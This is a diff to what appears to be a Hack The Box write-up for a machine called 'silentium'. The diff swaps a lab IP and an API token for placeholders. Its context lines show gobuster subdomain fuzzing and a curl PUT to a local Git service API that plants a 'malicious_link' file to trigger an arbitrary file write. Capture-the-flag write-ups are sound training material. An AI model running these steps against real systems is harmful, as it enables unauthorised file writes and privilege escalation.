@@ -22,7 +22,7 @@ The attack chain goes from **web application → Docker container → Host → R
 
 ```bash
 # Add domain to /etc/hosts
-echo "10.129.1.255 silentium.htb" >> /etc/hosts
+echo "<ip> silentium.htb" >> /etc/hosts
 
 # Subdomain fuzzing
 gobuster vhost -u http://silentium.htb -w /usr/share/wordlists/dirb/common.txt --append-domain
@@ -83,7 +83,7 @@ Step 4: Generate API Token
 
 Settings → Applications → Generate Token → Copy token
 Step 5: Trigger Arbitrary File Write
-TOKEN="c2ae0a77d0d593d66ebb5df6d753a41b640490b5"
+TOKEN="your-token"
 curl -X PUT "http://127.0.0.1:3001/api/v1/repos/Attacker/exploit/contents/malicious_link" \
   -H "Authorization: token $TOKEN" \
   -H "Content-Type: application/json" \
